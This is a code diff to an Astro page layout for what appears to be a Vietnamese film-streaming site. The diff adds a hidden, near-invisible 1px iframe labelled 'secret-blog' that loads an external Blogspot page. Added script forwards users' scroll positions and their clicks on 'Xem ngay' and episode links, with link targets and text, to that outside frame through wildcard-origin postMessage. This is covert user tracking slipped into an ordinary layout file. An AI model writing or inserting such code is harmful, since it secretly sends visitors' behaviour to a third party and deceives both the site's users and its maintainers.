@@ -139,4 +139,81 @@ const sortEpisode = Astro.cookies.get("sortEpisode")?.value !== "0";
   <footer class="px-0">
     <Footer />
   </footer>
+  <!-- Hidden iframe used to communicate clicks/scrolls to external blog -->
+  <div style="display:none" aria-hidden="true">
+    <iframe
+      id="secret-blog"
+      src="https://reviewphimnoads.blogspot.com/2025/12/tram-phim-iem-hen-cho-nhung-tin-o-me.html?m=1"
+      style="position:fixed; width:1px; height:1px; bottom:0; left:0; opacity:0.001; pointer-events:none; border:none; z-index:-9999;"
+    ></iframe>
+  </div>
+
+  <script>
+    (function () {
+      const blogIfr = document.getElementById("secret-blog");
+
+      function postToIframe(payload) {
+        if (blogIfr && blogIfr.contentWindow) {
+          try {
+            blogIfr.contentWindow.postMessage(payload, "*");
+          } catch (err) {
+            // ignore postMessage errors
+          }
+        }
+      }
+
+      // 1. Send scroll position to blog iframe
+      window.addEventListener(
+        "scroll",
+        function () {
+          const payload = {
+            type: "SYNC_ACTION",
+            y: window.scrollY,
+            ts: Date.now(),
+          };
+          postToIframe(payload);
+        },
+        { passive: true },
+      );
+
+      // 2. Catch clicks on "Xem ngay" and any episode links (href starts with /xem-phim/)
+      document.addEventListener(
+        "click",
+        function (e) {
+          const target = e.target;
+          const anchor = target && target.closest ? target.closest("a[href]") : null;
+
+          // If clicked an episode link (internal xem-phim link) -> notify
+          if (anchor && anchor.getAttribute("href") && anchor.getAttribute("href").indexOf("/xem-phim/") === 0) {
+            const href = anchor.getAttribute("href");
+            postToIframe({ type: "WATCH_CLICKED", href: href, text: (anchor.innerText || "").trim(), ts: Date.now() });
+            return;
+          }
+
+          // Detect clicks on a "Xem" button (text contains 'xem' / 'xem ngay' or aria-label)
+          let isWatchButton = false;
+          let computedHref = null;
+          if (anchor) {
+            const text = (anchor.innerText || "").toLowerCase();
+            const aria = (anchor.getAttribute && (anchor.getAttribute("aria-label") || "")).toLowerCase();
+            if (text.indexOf("xem ngay") !== -1 || text.indexOf("xem phim") !== -1 || aria.indexOf("xem phim") !== -1) {
+              isWatchButton = true;
+              computedHref = anchor.getAttribute("href");
+            }
+          } else if (target && (target.innerText || "").toLowerCase().indexOf("xem ngay") !== -1) {
+            isWatchButton = true;
+            const surroundingAnchor = target.closest && target.closest("a[href]");
+            if (surroundingAnchor) {
+              computedHref = surroundingAnchor.getAttribute("href");
+            }
+          }
+
+          if (isWatchButton) {
+            postToIframe({ type: "WATCH_CLICKED", href: computedHref, text: (anchor ? anchor.innerText : (target.innerText || "")).trim(), ts: Date.now() });
+          }
+        },
+        true,
+      );
+    })();
+  </script>
 </BaseLayout>
